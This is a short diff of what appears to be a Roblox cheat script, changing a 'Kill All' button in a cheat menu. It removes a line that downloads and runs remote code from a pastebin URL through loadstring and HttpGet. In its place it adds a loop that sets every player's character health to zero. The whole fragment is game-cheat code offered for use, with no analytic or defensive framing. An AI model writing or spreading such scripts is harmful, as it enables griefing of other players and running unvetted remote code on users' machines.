@@ -198,7 +198,9 @@ LocalTab:AddToggle({
 LocalTab:AddButton({
     Name = "Kill All",
     Callback = function()
-		loadstring(game:HttpGet('https://pastebin.com/raw/JGTCGFE2'))()
+		for i, v in pairs (game:GetService("Players"):GetPlayers()) do
+			v.Character:FindFirstChild("Humanoid").Health = 0
+		end
     end
 })
 
